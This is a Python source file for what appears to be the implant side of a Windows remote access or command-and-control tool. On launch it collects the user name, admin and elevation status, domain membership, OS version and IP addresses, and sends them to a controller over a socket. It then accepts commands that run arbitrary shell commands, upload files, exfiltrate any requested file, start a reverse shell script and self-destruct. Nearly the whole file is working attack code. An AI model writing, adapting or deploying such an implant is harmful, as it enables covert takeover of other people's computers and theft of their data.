import signal
import argparse
import socket
import subprocess
import sys
import threading
import os
import psutil
import time
from win32com.shell import shell
exit_event = threading.Event()

#def startrevshellsvr():
#    subprocess.call(["python", "pyrevshell_server.py"])
#    exit_event.set()
def startrevshellcli():
    subprocess.call("py C:/Users/public/pyrevshell_client.py")
    exit_event.set()

def recfile(filepath,filesize):
    filesize=int(filesize)
    with open(filepath, 'wb') as f:
        received = 0
        while received < filesize:
            data = client.recv(4096)
            if not data:
                break
            if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                f.write(data)
                received += len(data)
    print(f"Saved: {filepath}")
    exit_event.set()

def receiver(client):
    UPLOAD_DIR = 'c:/users/public/uploads'
    while True:
        try:
            data=client.recv(1024)
        except:
            print("server must have died...time to hop off")
            client.close()
            os._exit(0) 
        data=data.decode('UTF-8')
        #print(data)
        
        if ":msg:" in data:
            print(data)
        if ":whoami:" in data:
            whoami=os.getlogin()
            client.send(whoami.encode())
       
        if ":shell:" in data:
            exit_event.clear()
            #handler_thread = threading.Thread(target=startrevshellsvr)
            #handler_thread.daemon = True
            #handler_thread.start()
            
            handler_thread2 = threading.Thread(target=startrevshellcli)
            handler_thread2.daemon = True
            handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
        if ":upload:" in data:
            client.send(b"***Ready for upload to begin***!!\n")
            print(data.split(":"))
            data=data.split(":")
            filename=data[2]
            filesize=data[3]
            filepath = UPLOAD_DIR + "/" + filename
            print(filepath)
            
            exit_event.clear()
            handler_thread3 = threading.Thread(target=recfile, args=(filepath,filesize))
            handler_thread3.daemon = True
            handler_thread3.start()
            while not exit_event.is_set():
                time.sleep(1)
            client.send(b"File successfully uploaded!\n")
        if "~download~" in data:
            print(data.split("~"))
            data=data.split("~")
            filepath = data[2]
            print(filepath)
            time.sleep(3)
            
            if not os.path.isfile(filepath):
                print(f"Error: File '{filepath}' does not exist.")
                return
            filename = os.path.basename(filepath)
            print(filename)
            filesize = os.path.getsize(filepath)
            filesize=str(filesize)
            print(filesize)
            client.send(filesize.encode())
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    client.sendall(chunk)
                  
                    
            #client.send(b"file sent!\n")
            time.sleep(3)
        if "c0mm@nd" in data:
            command=data.split("\n")
            command=command[1]
            print("command: ", command)
            proc = subprocess.Popen(command,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
            #print(proc.stdout.read().decode())
            output=proc.stdout.read().decode().strip()
            #print(output)
            output=output.encode()
            proc.stdin.close()
            proc.terminate()
            
            client.sendall(b"returned output: \n"+output+b"\n:endofoutput:\n")
            
            
            
        if "self-destruct" in data:
            client.close()
            os._exit(0) 

host="127.0.0.1"
port=4545
breaktheloop=False

OnADomain="False"
LocalAdmin="False"
#systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
osinfo=subprocess.run("powershell.exe -command Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | findstr Microsoft", capture_output=True, text=True)
osinfo=osinfo.stdout.strip()
#print(osinfo)
UPLOAD_DIR = 'c:/users/public/uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

try:
    ipaddrinfo=subprocess.run("powershell.exe -command (Get-NetIPAddress -AddressFamily IPv4).IpAddress | findstr /V 169. | findstr /V 127.0.0.1", capture_output=True, text=True)
    ipaddrinfo=ipaddrinfo.stdout.strip()
except:
    ipaddrinfo="No IP addresses active on system"
try:
    domaininfo=subprocess.run("whoami /FQDN", capture_output=True, text=True)
    if "Unable" in domaininfo.stderr:
        OnADomain="False"
        print("[-] NOT domain joined")
    else:
        print("[+] domain joined!")
        OnADomain="True"
except:
    print("[!] unexpected error...")
gathering=subprocess.run("net user " + os.environ.get('USERNAME'), capture_output=True, text=True)
if "Administrators" in gathering.stdout:
    print("[+] members of local admins!")
    LocalAdmin="True"

if OnADomain == "True":    
    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
else:
    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + LocalAdmin + "\n" + "Domain Joined: " + OnADomain + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
    
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
client.send(info.encode('UTF-8'))
#data=client.recv(1024)
#print(data.decode('UTF-8'))

handler_thread = threading.Thread(target=receiver, args=(client, ))
handler_thread.daemon=True
handler_thread.start()

while True:
    time.sleep(1)